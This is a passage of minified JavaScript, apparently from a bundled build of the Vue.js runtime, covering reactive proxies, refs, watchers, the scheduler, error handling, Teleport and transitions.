    push(...e) {
        return yi(this, "push", e)
    },
    reduce(e, ...t) {
        return Od(this, "reduce", e, t)
    },
    reduceRight(e, ...t) {
        return Od(this, "reduceRight", e, t)
    },
    shift() {
        return yi(this, "shift")
    },
    some(e, t) {
        return _n(this, "some", e, t, void 0, arguments)
    },
    splice(...e) {
        return yi(this, "splice", e)
    },
    toReversed() {
        return bs(this).toReversed()
    },
    toSorted(e) {
        return bs(this).toSorted(e)
    },
    toSpliced(...e) {
        return bs(this).toSpliced(...e)
    },
    unshift(...e) {
        return yi(this, "unshift", e)
    },
    values() {
        return Rl(this, "values", e => cr(this, e))
    }
};

function Rl(e, t, n) {
    const r = Nc(e),
        s = r[t]();
    return r !== e && !_t(e) && (s._next = s.next, s.next = () => {
        const i = s._next();
        return i.done || (i.value = n(i.value)), i
    }), s
}
const By = Array.prototype;

function _n(e, t, n, r, s, i) {
    const o = Nc(e),
        a = o !== e && !_t(e),
        c = o[t];
    if (c !== By[t]) {
        const f = c.apply(e, i);
        return a ? Yt(f) : f
    }
    let u = n;
    o !== e && (a ? u = function(f, d) {
        return n.call(this, cr(e, f), d, e)
    } : n.length > 2 && (u = function(f, d) {
        return n.call(this, f, d, e)
    }));
    const l = c.call(o, u, r);
    return a && s ? s(l) : l
}

function Od(e, t, n, r) {
    const s = Nc(e);
    let i = n;
    return s !== e && (_t(e) ? n.length > 3 && (i = function(o, a, c) {
        return n.call(this, o, a, c, e)
    }) : i = function(o, a, c) {
        return n.call(this, o, cr(e, a), c, e)
    }), s[t](i, ...r)
}

function Ml(e, t, n) {
    const r = he(e);
    tt(r, "iterate", Gi);
    const s = r[t](...n);
    return (s === -1 || s === !1) && $o(n[0]) ? (n[0] = he(n[0]), r[t](...n)) : s
}

function yi(e, t, n = []) {
    jn(), R0();
    const r = he(e)[t].apply(e, n);
    return M0(), zn(), r
}
const Ly = je("__proto__,__v_isRef,__isVue"),
    o1 = new Set(Object.getOwnPropertyNames(Symbol).filter(e => e !== "arguments" && e !== "caller").map(e => Symbol[e]).filter(ft));

function $y(e) {
    ft(e) || (e = String(e));
    const t = he(this);
    return tt(t, "has", e), t.hasOwnProperty(e)
}
class a1 {
    constructor(t = !1, n = !1) {
        this._isReadonly = t, this._isShallow = n
    }
    get(t, n, r) {
        if (n === "__v_skip") return t.__v_skip;
        const s = this._isReadonly,
            i = this._isShallow;
        if (n === "__v_isReactive") return !s;
        if (n === "__v_isReadonly") return s;
        if (n === "__v_isShallow") return i;
        if (n === "__v_raw") return r === (s ? i ? h1 : d1 : i ? f1 : u1).get(t) || Object.getPrototypeOf(t) === Object.getPrototypeOf(r) ? t : void 0;
        const o = K(t);
        if (!s) {
            let c;
            if (o && (c = ky[n])) return c;
            if (n === "hasOwnProperty") return $y
        }
        const a = Reflect.get(t, n, ke(t) ? t : r);
        if ((ft(n) ? o1.has(n) : Ly(n)) || (s || tt(t, "get", n), i)) return a;
        if (ke(a)) {
            const c = o && Mo(n) ? a : a.value;
            return s && me(c) ? Va(c) : c
        }
        return me(a) ? s ? Va(a) : Oc(a) : a
    }
}
class c1 extends a1 {
    constructor(t = !1) {
        super(!1, t)
    }
    set(t, n, r, s) {
        let i = t[n];
        const o = K(t) && Mo(n);
        if (!this._isShallow) {
            const u = pn(i);
            if (!_t(r) && !pn(r) && (i = he(i), r = he(r)), !o && ke(i) && !ke(r)) return u || (i.value = r), !0
        }
        const a = o ? Number(n) < t.length : pe(t, n),
            c = Reflect.set(t, n, r, ke(t) ? t : s);
        return t === he(s) && (a ? et(r, i) && On(t, "set", n, r) : On(t, "add", n, r)), c
    }
    deleteProperty(t, n) {
        const r = pe(t, n);
        t[n];
        const s = Reflect.deleteProperty(t, n);
        return s && r && On(t, "delete", n, void 0), s
    }
    has(t, n) {
        const r = Reflect.has(t, n);
        return (!ft(n) || !o1.has(n)) && tt(t, "has", n), r
    }
    ownKeys(t) {
        return tt(t, "iterate", K(t) ? "length" : qr), Reflect.ownKeys(t)
    }
}
class l1 extends a1 {
    constructor(t = !1) {
        super(!0, t)
    }
    set(t, n) {
        return !0
    }
    deleteProperty(t, n) {
        return !0
    }
}
const Dy = new c1,
    Fy = new l1,
    Uy = new c1(!0),
    Vy = new l1(!0),
    xu = e => e,
    aa = e => Reflect.getPrototypeOf(e);

function Hy(e, t, n) {
    return function(...r) {
        const s = this.__v_raw,
            i = he(s),
            o = Hr(i),
            a = e === "entries" || e === Symbol.iterator && o,
            c = e === "keys" && o,
            u = s[e](...r),
            l = n ? xu : t ? Fs : Yt;
        return !t && tt(i, "iterate", c ? gu : qr), {
            next() {
                const {
                    value: f,
                    done: d
                } = u.next();
                return d ? {
                    value: f,
                    done: d
                } : {
                    value: a ? [l(f[0]), l(f[1])] : l(f),
                    done: d
                }
            },
            [Symbol.iterator]() {
                return this
            }
        }
    }
}

function ca(e) {
    return function(...t) {
        return e === "delete" ? !1 : e === "clear" ? void 0 : this
    }
}

function jy(e, t) {
    const n = {
        get(s) {
            const i = this.__v_raw,
                o = he(i),
                a = he(s);
            e || (et(s, a) && tt(o, "get", s), tt(o, "get", a));
            const {
                has: c
            } = aa(o), u = t ? xu : e ? Fs : Yt;
            if (c.call(o, s)) return u(i.get(s));
            if (c.call(o, a)) return u(i.get(a));
            i !== o && i.get(s)
        },
        get size() {
            const s = this.__v_raw;
            return !e && tt(he(s), "iterate", qr), s.size
        },
        has(s) {
            const i = this.__v_raw,
                o = he(i),
                a = he(s);
            return e || (et(s, a) && tt(o, "has", s), tt(o, "has", a)), s === a ? i.has(s) : i.has(s) || i.has(a)
        },
        forEach(s, i) {
            const o = this,
                a = o.__v_raw,
                c = he(a),
                u = t ? xu : e ? Fs : Yt;
            return !e && tt(c, "iterate", qr), a.forEach((l, f) => s.call(i, u(l), u(f), o))
        }
    };
    return ae(n, e ? {
        add: ca("add"),
        set: ca("set"),
        delete: ca("delete"),
        clear: ca("clear")
    } : {
        add(s) {
            !t && !_t(s) && !pn(s) && (s = he(s));
            const i = he(this);
            return aa(i).has.call(i, s) || (i.add(s), On(i, "add", s, s)), this
        },
        set(s, i) {
            !t && !_t(i) && !pn(i) && (i = he(i));
            const o = he(this),
                {
                    has: a,
                    get: c
                } = aa(o);
            let u = a.call(o, s);
            u || (s = he(s), u = a.call(o, s));
            const l = c.call(o, s);
            return o.set(s, i), u ? et(i, l) && On(o, "set", s, i) : On(o, "add", s, i), this
        },
        delete(s) {
            const i = he(this),
                {
                    has: o,
                    get: a
                } = aa(i);
            let c = o.call(i, s);
            c || (s = he(s), c = o.call(i, s)), a && a.call(i, s);
            const u = i.delete(s);
            return c && On(i, "delete", s, void 0), u
        },
        clear() {
            const s = he(this),
                i = s.size !== 0,
                o = s.clear();
            return i && On(s, "clear", void 0, void 0), o
        }
    }), ["keys", "values", "entries", Symbol.iterator].forEach(s => {
        n[s] = Hy(s, e, t)
    }), n
}

function Pc(e, t) {
    const n = jy(e, t);
    return (r, s, i) => s === "__v_isReactive" ? !e : s === "__v_isReadonly" ? e : s === "__v_raw" ? r : Reflect.get(pe(n, s) && s in r ? n : r, s, i)
}
const zy = {
        get: Pc(!1, !1)
    },
    qy = {
        get: Pc(!1, !0)
    },
    Gy = {
        get: Pc(!0, !1)
    },
    Wy = {
        get: Pc(!0, !0)
    },
    u1 = new WeakMap,
    f1 = new WeakMap,
    d1 = new WeakMap,
    h1 = new WeakMap;

function Xy(e) {
    switch (e) {
        case "Object":
        case "Array":
            return 1;
        case "Map":
        case "Set":
        case "WeakMap":
        case "WeakSet":
            return 2;
        default:
            return 0
    }
}

function Ky(e) {
    return e.__v_skip || !Object.isExtensible(e) ? 0 : Xy(Dp(e))
}

function Oc(e) {
    return pn(e) ? e : Rc(e, !1, Dy, zy, u1)
}

function p1(e) {
    return Rc(e, !1, Uy, qy, f1)
}

function Va(e) {
    return Rc(e, !0, Fy, Gy, d1)
}

function Zy(e) {
    return Rc(e, !0, Vy, Wy, h1)
}

function Rc(e, t, n, r, s) {
    if (!me(e) || e.__v_raw && !(t && e.__v_isReactive)) return e;
    const i = Ky(e);
    if (i === 0) return e;
    const o = s.get(e);
    if (o) return o;
    const a = new Proxy(e, i === 2 ? r : n);
    return s.set(e, a), a
}

function Ln(e) {
    return pn(e) ? Ln(e.__v_raw) : !!(e && e.__v_isReactive)
}

function pn(e) {
    return !!(e && e.__v_isReadonly)
}

function _t(e) {
    return !!(e && e.__v_isShallow)
}

function $o(e) {
    return e ? !!e.__v_raw : !1
}

function he(e) {
    const t = e && e.__v_raw;
    return t ? he(t) : e
}

function m1(e) {
    return !pe(e, "__v_skip") && Object.isExtensible(e) && I0(e, "__v_skip", !0), e
}
const Yt = e => me(e) ? Oc(e) : e,
    Fs = e => me(e) ? Va(e) : e;

function ke(e) {
    return e ? e.__v_isRef === !0 : !1
}

function Li(e) {
    return g1(e, !1)
}

function b1(e) {
    return g1(e, !0)
}

function g1(e, t) {
    return ke(e) ? e : new Yy(e, t)
}
class Yy {
    constructor(t, n) {
        this.dep = new Ac, this.__v_isRef = !0, this.__v_isShallow = !1, this._rawValue = n ? t : he(t), this._value = n ? t : Yt(t), this.__v_isShallow = n
    }
    get value() {
        return this.dep.track(), this._value
    }
    set value(t) {
        const n = this._rawValue,
            r = this.__v_isShallow || _t(t) || pn(t);
        t = r ? t : he(t), et(t, n) && (this._rawValue = t, this._value = r ? t : Yt(t), this.dep.trigger())
    }
}

function Jy(e) {
    e.dep && e.dep.trigger()
}

function Do(e) {
    return ke(e) ? e.value : e
}

function Qy(e) {
    return te(e) ? e() : Do(e)
}
const e5 = {
    get: (e, t, n) => t === "__v_raw" ? e : Do(Reflect.get(e, t, n)),
    set: (e, t, n, r) => {
        const s = e[t];
        return ke(s) && !ke(n) ? (s.value = n, !0) : Reflect.set(e, t, n, r)
    }
};

function B0(e) {
    return Ln(e) ? e : new Proxy(e, e5)
}
class t5 {
    constructor(t) {
        this.__v_isRef = !0, this._value = void 0;
        const n = this.dep = new Ac,
            {
                get: r,
                set: s
            } = t(n.track.bind(n), n.trigger.bind(n));
        this._get = r, this._set = s
    }
    get value() {
        return this._value = this._get()
    }
    set value(t) {
        this._set(t)
    }
}

function x1(e) {
    return new t5(e)
}

function n5(e) {
    const t = K(e) ? new Array(e.length) : {};
    for (const n in e) t[n] = y1(e, n);
    return t
}
class r5 {
    constructor(t, n, r) {
        this._object = t, this._key = n, this._defaultValue = r, this.__v_isRef = !0, this._value = void 0, this._raw = he(t);
        let s = !0,
            i = t;
        if (!K(t) || !Mo(String(n)))
            do s = !$o(i) || _t(i); while (s && (i = i.__v_raw));
        this._shallow = s
    }
    get value() {
        let t = this._object[this._key];
        return this._shallow && (t = Do(t)), this._value = t === void 0 ? this._defaultValue : t
    }
    set value(t) {
        if (this._shallow && ke(this._raw[this._key])) {
            const n = this._object[this._key];
            if (ke(n)) {
                n.value = t;
                return
            }
        }
        this._object[this._key] = t
    }
    get dep() {
        return My(this._raw, this._key)
    }
}
class s5 {
    constructor(t) {
        this._getter = t, this.__v_isRef = !0, this.__v_isReadonly = !0, this._value = void 0
    }
    get value() {
        return this._value = this._getter()
    }
}

function i5(e, t, n) {
    return ke(e) ? e : te(e) ? new s5(e) : me(e) && arguments.length > 1 ? y1(e, t, n) : Li(e)
}

function y1(e, t, n) {
    return new r5(e, t, n)
}
class o5 {
    constructor(t, n, r) {
        this.fn = t, this.setter = n, this._value = void 0, this.dep = new Ac(this), this.__v_isRef = !0, this.deps = void 0, this.depsTail = void 0, this.flags = 16, this.globalVersion = qi - 1, this.next = void 0, this.effect = this, this.__v_isReadonly = !n, this.isSSR = r
    }
    notify() {
        if (this.flags |= 16, !(this.flags & 8) && we !== this) return e1(this, !0), !0
    }
    get value() {
        const t = this.dep.track();
        return r1(this), t && (t.version = this.dep.version), this._value
    }
    set value(t) {
        this.setter && this.setter(t)
    }
}

function a5(e, t, n = !1) {
    let r, s;
    return te(e) ? r = e : (r = e.get, s = e.set), new o5(r, s, n)
}
const c5 = {
        GET: "get",
        HAS: "has",
        ITERATE: "iterate"
    },
    l5 = {
        SET: "set",
        ADD: "add",
        DELETE: "delete",
        CLEAR: "clear"
    },
    la = {},
    Ha = new WeakMap;
let lr;

function u5() {
    return lr
}

function w1(e, t = !1, n = lr) {
    if (n) {
        let r = Ha.get(n);
        r || Ha.set(n, r = []), r.push(e)
    }
}

function f5(e, t, n = ue) {
    const {
        immediate: r,
        deep: s,
        once: i,
        scheduler: o,
        augmentJob: a,
        call: c
    } = n, u = p => s ? p : _t(p) || s === !1 || s === 0 ? Rn(p, 1) : Rn(p);
    let l, f, d, h, b = !1,
        m = !1;
    if (ke(e) ? (f = () => e.value, b = _t(e)) : Ln(e) ? (f = () => u(e), b = !0) : K(e) ? (m = !0, b = e.some(p => Ln(p) || _t(p)), f = () => e.map(p => {
            if (ke(p)) return p.value;
            if (Ln(p)) return u(p);
            if (te(p)) return c ? c(p, 2) : p()
        })) : te(e) ? t ? f = c ? () => c(e, 2) : e : f = () => {
            if (d) {
                jn();
                try {
                    d()
                } finally {
                    zn()
                }
            }
            const p = lr;
            lr = l;
            try {
                return c ? c(e, 3, [h]) : e(h)
            } finally {
                lr = p
            }
        } : f = He, t && s) {
        const p = f,
            w = s === !0 ? 1 / 0 : s;
        f = () => Rn(p(), w)
    }
    const _ = Jp(),
        E = () => {
            l.stop(), _ && _.active && Sc(_.effects, l)
        };
    if (i && t) {
        const p = t;
        t = (...w) => {
            p(...w), E()
        }
    }
    let S = m ? new Array(e.length).fill(la) : la;
    const g = p => {
        if (!(!(l.flags & 1) || !l.dirty && !p))
            if (t) {
                const w = l.run();
                if (s || b || (m ? w.some((A, N) => et(A, S[N])) : et(w, S))) {
                    d && d();
                    const A = lr;
                    lr = l;
                    try {
                        const N = [w, S === la ? void 0 : m && S[0] === la ? [] : S, h];
                        S = w, c ? c(t, 3, N) : t(...N)
                    } finally {
                        lr = A
                    }
                }
            } else l.run()
    };
    return a && a(g), l = new zi(f), l.scheduler = o ? () => o(g, !1) : g, h = p => w1(p, !1, l), d = l.onStop = () => {
        const p = Ha.get(l);
        if (p) {
            if (c) c(p, 4);
            else
                for (const w of p) w();
            Ha.delete(l)
        }
    }, t ? r ? g(!0) : S = l.run() : o ? o(g.bind(null, !0), !0) : l.run(), E.pause = l.pause.bind(l), E.resume = l.resume.bind(l), E.stop = E, E
}

function Rn(e, t = 1 / 0, n) {
    if (t <= 0 || !me(e) || e.__v_skip || (n = n || new Map, (n.get(e) || 0) >= t)) return e;
    if (n.set(e, t), t--, ke(e)) Rn(e.value, t, n);
    else if (K(e))
        for (let r = 0; r < e.length; r++) Rn(e[r], t, n);
    else if (Tr(e) || Hr(e)) e.forEach(r => {
        Rn(r, t, n)
    });
    else if (Ro(e)) {
        for (const r in e) Rn(e[r], t, n);
        for (const r of Object.getOwnPropertySymbols(e)) Object.prototype.propertyIsEnumerable.call(e, r) && Rn(e[r], t, n)
    }
    return e
}
const _1 = [];

function d5(e) {
    _1.push(e)
}

function h5() {
    _1.pop()
}

function p5(e, t) {}
const m5 = {
        SETUP_FUNCTION: 0,
        0: "SETUP_FUNCTION",
        RENDER_FUNCTION: 1,
        1: "RENDER_FUNCTION",
        NATIVE_EVENT_HANDLER: 5,
        5: "NATIVE_EVENT_HANDLER",
        COMPONENT_EVENT_HANDLER: 6,
        6: "COMPONENT_EVENT_HANDLER",
        VNODE_HOOK: 7,
        7: "VNODE_HOOK",
        DIRECTIVE_HOOK: 8,
        8: "DIRECTIVE_HOOK",
        TRANSITION_HOOK: 9,
        9: "TRANSITION_HOOK",
        APP_ERROR_HANDLER: 10,
        10: "APP_ERROR_HANDLER",
        APP_WARN_HANDLER: 11,
        11: "APP_WARN_HANDLER",
        FUNCTION_REF: 12,
        12: "FUNCTION_REF",
        ASYNC_COMPONENT_LOADER: 13,
        13: "ASYNC_COMPONENT_LOADER",
        SCHEDULER: 14,
        14: "SCHEDULER",
        COMPONENT_UPDATE: 15,
        15: "COMPONENT_UPDATE",
        APP_UNMOUNT_CLEANUP: 16,
        16: "APP_UNMOUNT_CLEANUP"
    },
    b5 = {
        sp: "serverPrefetch hook",
        bc: "beforeCreate hook",
        c: "created hook",
        bm: "beforeMount hook",
        m: "mounted hook",
        bu: "beforeUpdate hook",
        u: "updated",
        bum: "beforeUnmount hook",
        um: "unmounted hook",
        a: "activated hook",
        da: "deactivated hook",
        ec: "errorCaptured hook",
        rtc: "renderTracked hook",
        rtg: "renderTriggered hook",
        0: "setup function",
        1: "render function",
        2: "watcher getter",
        3: "watcher callback",
        4: "watcher cleanup function",
        5: "native event handler",
        6: "component event handler",
        7: "vnode hook",
        8: "directive hook",
        9: "transition hook",
        10: "app errorHandler",
        11: "app warnHandler",
        12: "ref function",
        13: "async component loader",
        14: "scheduler flush",
        15: "component update",
        16: "app unmount cleanup function"
    };

function oi(e, t, n, r) {
    try {
        return r ? e(...r) : e()
    } catch (s) {
        ds(s, t, n)
    }
}

function jt(e, t, n, r) {
    if (te(e)) {
        const s = oi(e, t, n, r);
        return s && Cc(s) && s.catch(i => {
            ds(i, t, n)
        }), s
    }
    if (K(e)) {
        const s = [];
        for (let i = 0; i < e.length; i++) s.push(jt(e[i], t, n, r));
        return s
    }
}

function ds(e, t, n, r = !0) {
    const s = t ? t.vnode : null,
        {
            errorHandler: i,
            throwUnhandledErrorInProduction: o
        } = t && t.appContext.config || ue;
    if (t) {
        let a = t.parent;
        const c = t.proxy,
            u = `https://vuejs.org/error-reference/#runtime-${n}`;
        for (; a;) {
            const l = a.ec;
            if (l) {
                for (let f = 0; f < l.length; f++)
                    if (l[f](e, c, u) === !1) return
            }
            a = a.parent
        }
        if (i) {
            jn(), oi(i, null, 10, [e, c, u]), zn();
            return
        }
    }
    g5(e, n, s, r, o)
}

function g5(e, t, n, r = !0, s = !1) {
    if (s) throw e;
    console.error(e)
}
const ot = [];
let un = -1;
const Ps = [];
let ur = null,
    Es = 0;
const E1 = Promise.resolve();
let ja = null;

function Mc(e) {
    const t = ja || E1;
    return e ? t.then(this ? e.bind(this) : e) : t
}

function x5(e) {
    let t = un + 1,
        n = ot.length;
    for (; t < n;) {
        const r = t + n >>> 1,
            s = ot[r],
            i = Xi(s);
        i < e || i === e && s.flags & 2 ? t = r + 1 : n = r
    }
    return t
}

function L0(e) {
    if (!(e.flags & 1)) {
        const t = Xi(e),
            n = ot[ot.length - 1];
        !n || !(e.flags & 2) && t >= Xi(n) ? ot.push(e) : ot.splice(x5(t), 0, e), e.flags |= 1, v1()
    }
}

function v1() {
    ja || (ja = E1.then(T1))
}

function Wi(e) {
    K(e) ? Ps.push(...e) : ur && e.id === -1 ? ur.splice(Es + 1, 0, e) : e.flags & 1 || (Ps.push(e), e.flags |= 1), v1()
}

function Rd(e, t, n = un + 1) {
    for (; n < ot.length; n++) {
        const r = ot[n];
        if (r && r.flags & 2) {
            if (e && r.id !== e.uid) continue;
            ot.splice(n, 1), n--, r.flags & 4 && (r.flags &= -2), r(), r.flags & 4 || (r.flags &= -2)
        }
    }
}

function za(e) {
    if (Ps.length) {
        const t = [...new Set(Ps)].sort((n, r) => Xi(n) - Xi(r));
        if (Ps.length = 0, ur) {
            ur.push(...t);
            return
        }
        for (ur = t, Es = 0; Es < ur.length; Es++) {
            const n = ur[Es];
            n.flags & 4 && (n.flags &= -2), n.flags & 8 || n(), n.flags &= -2
        }
        ur = null, Es = 0
    }
}
const Xi = e => e.id == null ? e.flags & 2 ? -1 : 1 / 0 : e.id;

function T1(e) {
    try {
        for (un = 0; un < ot.length; un++) {
            const t = ot[un];
            t && !(t.flags & 8) && (t.flags & 4 && (t.flags &= -2), oi(t, t.i, t.i ? 15 : 14), t.flags & 4 || (t.flags &= -2))
        }
    } finally {
        for (; un < ot.length; un++) {
            const t = ot[un];
            t && (t.flags &= -2)
        }
        un = -1, ot.length = 0, za(), ja = null, (ot.length || Ps.length) && T1()
    }
}
let vs, ua = [];

function S1(e, t) {
    var n, r;
    vs = e, vs ? (vs.enabled = !0, ua.forEach(({
        event: s,
        args: i
    }) => vs.emit(s, ...i)), ua = []) : typeof window < "u" && window.HTMLElement && !((r = (n = window.navigator) == null ? void 0 : n.userAgent) != null && r.includes("jsdom")) ? ((t.__VUE_DEVTOOLS_HOOK_REPLAY__ = t.__VUE_DEVTOOLS_HOOK_REPLAY__ || []).push(i => {
        S1(i, t)
    }), setTimeout(() => {
        vs || (t.__VUE_DEVTOOLS_HOOK_REPLAY__ = null, ua = [])
    }, 3e3)) : ua = []
}
let Ge = null,
    kc = null;

function Ki(e) {
    const t = Ge;
    return Ge = e, kc = e && e.type.__scopeId || null, t
}

function y5(e) {
    kc = e
}

function w5() {
    kc = null
}
const _5 = e => $0;

function $0(e, t = Ge, n) {
    if (!t || e._n) return e;
    const r = (...s) => {
        r._d && Ji(-1);
        const i = Ki(t);
        let o;
        try {
            o = e(...s)
        } finally {
            Ki(i), r._d && Ji(1)
        }
        return o
    };
    return r._n = !0, r._c = !0, r._d = !0, r
}

function Pi(e, t) {
    if (Ge === null) return e;
    const n = Ho(Ge),
        r = e.dirs || (e.dirs = []);
    for (let s = 0; s < t.length; s++) {
        let [i, o, a, c = ue] = t[s];
        i && (te(i) && (i = {
            mounted: i,
            updated: i
        }), i.deep && Rn(o), r.push({
            dir: i,
            instance: n,
            value: o,
            oldValue: void 0,
            arg: a,
            modifiers: c
        }))
    }
    return e
}

function fn(e, t, n, r) {
    const s = e.dirs,
        i = t && t.dirs;
    for (let o = 0; o < s.length; o++) {
        const a = s[o];
        i && (a.oldValue = i[o].value);
        let c = a.dir[r];
        c && (jn(), jt(c, n, 8, [e.el, a, e, t]), zn())
    }
}
const C1 = Symbol("_vte"),
    I1 = e => e.__isTeleport,
    $i = e => e && (e.disabled || e.disabled === ""),
    Md = e => e && (e.defer || e.defer === ""),
    kd = e => typeof SVGElement < "u" && e instanceof SVGElement,
    Bd = e => typeof MathMLElement == "function" && e instanceof MathMLElement,
    yu = (e, t) => {
        const n = e && e.to;
        return re(n) ? t ? t(n) : null : n
    },
    A1 = {
        name: "Teleport",
        __isTeleport: !0,
        process(e, t, n, r, s, i, o, a, c, u) {
            const {
                mc: l,
                pc: f,
                pbc: d,
                o: {
                    insert: h,
                    querySelector: b,
                    createText: m,
                    createComment: _
                }
            } = u, E = $i(t.props);
            let {
                shapeFlag: S,
                children: g,
                dynamicChildren: p
            } = t;
            if (e == null) {
                const w = t.el = m(""),
                    A = t.anchor = m("");
                h(w, n, r), h(A, n, r);
                const N = (y, x) => {
                        S & 16 && l(g, y, x, s, i, o, a, c)
                    },
                    v = () => {
                        const y = t.target = yu(t.props, b),
                            x = N1(y, t, m, h);
                        y && (o !== "svg" && kd(y) ? o = "svg" : o !== "mathml" && Bd(y) && (o = "mathml"), s && s.isCE && (s.ce._teleportTargets || (s.ce._teleportTargets = new Set)).add(y), E || (N(y, x), Ca(t, !1)))
                    };
                E && (N(n, A), Ca(t, !0)), Md(t.props) ? (t.el.__isMounted = !1, Re(() => {
                    v(), delete t.el.__isMounted
                }, i)) : v()
            } else {
                if (Md(t.props) && e.el.__isMounted === !1) {
                    Re(() => {
                        A1.process(e, t, n, r, s, i, o, a, c, u)
                    }, i);
                    return
                }
                t.el = e.el, t.targetStart = e.targetStart;
                const w = t.anchor = e.anchor,
                    A = t.target = e.target,
                    N = t.targetAnchor = e.targetAnchor,
                    v = $i(e.props),
                    y = v ? n : A,
                    x = v ? w : N;
                if (o === "svg" || kd(A) ? o = "svg" : (o === "mathml" || Bd(A)) && (o = "mathml"), p ? (d(e.dynamicChildren, p, y, s, i, o, a), K0(e, t, !0)) : c || f(e, t, y, x, s, i, o, a, !1), E) v ? t.props && e.props && t.props.to !== e.props.to && (t.props.to = e.props.to) : fa(t, n, w, u, 1);
                else if ((t.props && t.props.to) !== (e.props && e.props.to)) {
                    const I = t.target = yu(t.props, b);
                    I && fa(t, I, null, u, 0)
                } else v && fa(t, A, N, u, 1);
                Ca(t, E)
            }
        },
        remove(e, t, n, {
            um: r,
            o: {
                remove: s
            }
        }, i) {
            const {
                shapeFlag: o,
                children: a,
                anchor: c,
                targetStart: u,
                targetAnchor: l,
                target: f,
                props: d
            } = e;
            if (f && (s(u), s(l)), i && s(c), o & 16) {
                const h = i || !$i(d);
                for (let b = 0; b < a.length; b++) {
                    const m = a[b];
                    r(m, t, n, h, !!m.dynamicChildren)
                }
            }
        },
        move: fa,
        hydrate: E5
    };

function fa(e, t, n, {
    o: {
        insert: r
    },
    m: s
}, i = 2) {
    i === 0 && r(e.targetAnchor, t, n);
    const {
        el: o,
        anchor: a,
        shapeFlag: c,
        children: u,
        props: l
    } = e, f = i === 2;
    if (f && r(o, t, n), (!f || $i(l)) && c & 16)
        for (let d = 0; d < u.length; d++) s(u[d], t, n, 2);
    f && r(a, t, n)
}

function E5(e, t, n, r, s, i, {
    o: {
        nextSibling: o,
        parentNode: a,
        querySelector: c,
        insert: u,
        createText: l
    }
}, f) {
    function d(m, _, E, S) {
        _.anchor = f(o(m), _, a(m), n, r, s, i), _.targetStart = E, _.targetAnchor = S
    }
    const h = t.target = yu(t.props, c),
        b = $i(t.props);
    if (h) {
        const m = h._lpa || h.firstChild;
        if (t.shapeFlag & 16)
            if (b) d(e, t, m, m && o(m));
            else {
                t.anchor = o(e);
                let _ = m;
                for (; _;) {
                    if (_ && _.nodeType === 8) {
                        if (_.data === "teleport start anchor") t.targetStart = _;
                        else if (_.data === "teleport anchor") {
                            t.targetAnchor = _, h._lpa = t.targetAnchor && o(t.targetAnchor);
                            break
                        }
                    }
                    _ = o(_)
                }
                t.targetAnchor || N1(h, t, l, u), f(m && o(m), t, h, n, r, s, i)
            } Ca(t, b)
    } else b && t.shapeFlag & 16 && d(e, t, e, o(e));
    return t.anchor && o(t.anchor)
}
const v5 = A1;

function Ca(e, t) {
    const n = e.ctx;
    if (n && n.ut) {
        let r, s;
        for (t ? (r = e.el, s = e.anchor) : (r = e.targetStart, s = e.targetAnchor); r && r !== s;) r.nodeType === 1 && r.setAttribute("data-v-owner", n.uid), r = r.nextSibling;
        n.ut()
    }
}

function N1(e, t, n, r) {
    const s = t.targetStart = n(""),
        i = t.targetAnchor = n("");
    return s[C1] = i, e && (r(s, e), r(i, e)), i
}
const An = Symbol("_leaveCb"),
    da = Symbol("_enterCb");

function D0() {
    const e = {
        isMounted: !1,
        isLeaving: !1,
        isUnmounting: !1,
        leavingVNodes: new Map
    };
    return Uo(() => {
        e.isMounted = !0
    }), Dc(() => {
        e.isUnmounting = !0
    }), e
}
const Dt = [Function, Array],
    F0 = {
        mode: String,
        appear: Boolean,
        persisted: Boolean,
        onBeforeEnter: Dt,
        onEnter: Dt,
        onAfterEnter: Dt,
        onEnterCancelled: Dt,
        onBeforeLeave: Dt,
        onLeave: Dt,
        onAfterLeave: Dt,
        onLeaveCancelled: Dt,
        onBeforeAppear: Dt,
        onAppear: Dt,
        onAfterAppear: Dt,
        onAppearCancelled: Dt
    },
    P1 = e => {
        const t = e.subTree;
        return t.component ? P1(t.component) : t
    },
    T5 = {
        name: "BaseTransition",
        props: F0,
        setup(e, {
            slots: t
        }) {
            const n = vt(),
                r = D0();
            return () => {
                const s = t.default && Bc(t.default(), !0);
                if (!s || !s.length) return;
                const i = O1(s),
                    o = he(e),
                    {
                        mode: a
                    } = o;
                if (r.isLeaving) return kl(i);
                const c = Ld(i);
                if (!c) return kl(i);
                let u = Us(c, o, r, n, f => u = f);
                c.type !== Pe && qn(c, u);
                let l = n.subTree && Ld(n.subTree);
                if (l && l.type !== Pe && !Xt(l, c) && P1(n).type !== Pe) {
                    let f = Us(l, o, r, n);
                    if (qn(l, f), a === "out-in" && c.type !== Pe) return r.isLeaving = !0, f.afterLeave = () => {
                        r.isLeaving = !1, n.job.flags & 8 || n.update(), delete f.afterLeave, l = void 0
                    }, kl(i);
                    a === "in-out" && c.type !== Pe ? f.delayLeave = (d, h, b) => {
                        const m = M1(r, l);
                        m[String(l.key)] = l, d[An] = () => {
                            h(), d[An] = void 0, delete u.delayedLeave, l = void 0
                        }, u.delayedLeave = () => {
                            b(), delete u.delayedLeave, l = void 0
                        }
                    } : l = void 0
                } else l && (l = void 0);
                return i
            }
        }
    };

function O1(e) {
    let t = e[0];
    if (e.length > 1) {
        for (const n of e)
            if (n.type !== Pe) {
                t = n;
                break
            }
    }
    return t
}
const R1 = T5;

function M1(e, t) {
    const {
        leavingVNodes: n
    } = e;
    let r = n.get(t.type);
    return r || (r = Object.create(null), n.set(t.type, r)), r
}

function Us(e, t, n, r, s) {
    const {
        appear: i,
        mode: o,
        persisted: a = !1,
        onBeforeEnter: c,
        onEnter: u,
        onAfterEnter: l,
        onEnterCancelled: f,
        onBeforeLeave: d,
        onLeave: h,
        onAfterLeave: b,
        onLeaveCancelled: m,
        onBeforeAppear: _,
        onAppear: E,
        onAfterAppear: S,
        onAppearCancelled: g
    } = t, p = String(e.key), w = M1(n, e), A = (y, x) => {
        y && jt(y, r, 9, x)
    }, N = (y, x) => {
        const I = x[1];
        A(y, x), K(y) ? y.every(T => T.length <= 1) && I() : y.length <= 1 && I()
    }, v = {
        mode: o,
        persisted: a,
        beforeEnter(y) {
            let x = c;
            if (!n.isMounted)
                if (i) x = _ || c;
                else return;
            y[An] && y[An](!0);
            const I = w[p];
            I && Xt(e, I) && I.el[An] && I.el[An](), A(x, [y])
        },
        enter(y) {
            let x = u,
                I = l,
                T = f;
            if (!n.isMounted)
                if (i) x = E || u, I = S || l, T = g || f;
                else return;
            let O = !1;
            const L = y[da] = k => {
                O || (O = !0, k ? A(T, [y]) : A(I, [y]), v.delayedLeave && v.delayedLeave(), y[da] = void 0)
            };
            x ? N(x, [y, L]) : L()
        },
